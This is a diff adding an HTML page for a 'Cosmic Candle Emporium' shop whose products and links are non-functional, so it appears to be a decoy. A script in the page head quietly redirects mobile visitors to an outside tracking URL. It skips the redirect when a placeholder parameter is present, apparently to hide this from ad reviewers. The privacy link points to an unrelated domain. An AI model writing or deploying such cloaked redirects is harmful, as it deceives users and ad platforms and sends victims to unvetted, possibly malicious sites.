@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const ttclid = urlParams.get("ttclid");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = "https://klcxb6.mcgo2.com/visit/7030fb24-f71e-4d19-916a-a1c232f79601?s1=${s}";
+    if (utmXXX === "__PLACEMENT__") { }
+    else if (isMobileDevice) { window.location.href = lander; } 
+    else { }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cosmic Candle Emporium</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(45deg, #1a1a2e, #16213e);
+            color: #e94560;
+            margin: 0;
+            padding: 0;
+        }
+        header {
+            background-color: #0f3460;
+            padding: 20px;
+            text-align: center;
+        }
+        nav {
+            display: flex;
+            justify-content: space-around;
+            background-color: #533483;
+            padding: 10px;
+        }
+        main {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            padding: 20px;
+        }
+        .product {
+            background-color: #16213e;
+            border-radius: 10px;
+            padding: 15px;
+            text-align: center;
+        }
+        footer {
+            background-color: #0f3460;
+            text-align: center;
+            padding: 10px;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Cosmic Candle Emporium</h1>
+    </header>
+    <nav>
+        <a href="#">Home</a>
+        <a href="#">Shop</a>
+        <a href="#">About</a>
+        <a href="#">Contact</a>
+    </nav>
+    <main>
+        <div class="product">
+            <h2>Nebula Nights</h2>
+            <p>A swirling galaxy of scents</p>
+            <button>Add to Cart</button>
+        </div>
+        <div class="product">
+            <h2>Supernova Spark</h2>
+            <p>Explosive fragrance burst</p>
+            <button>Add to Cart</button>
+        </div>
+        <div class="product">
+            <h2>Lunar Lavender</h2>
+            <p>Calming moonlit aroma</p>
+            <button>Add to Cart</button>
+        </div>
+        <div class="product">
+            <h2>Solar Flare Citrus</h2>
+            <p>Energizing sun-kissed scent</p>
+            <button>Add to Cart</button>
+        </div>
+    </main>
+    <footer>
+        <p>&copy; 2023 Cosmic Candle Emporium. <a href="https://tokreward.com/privacy.html">Privacy Policy</a></p>
+    </footer>
+</body>
+</html>
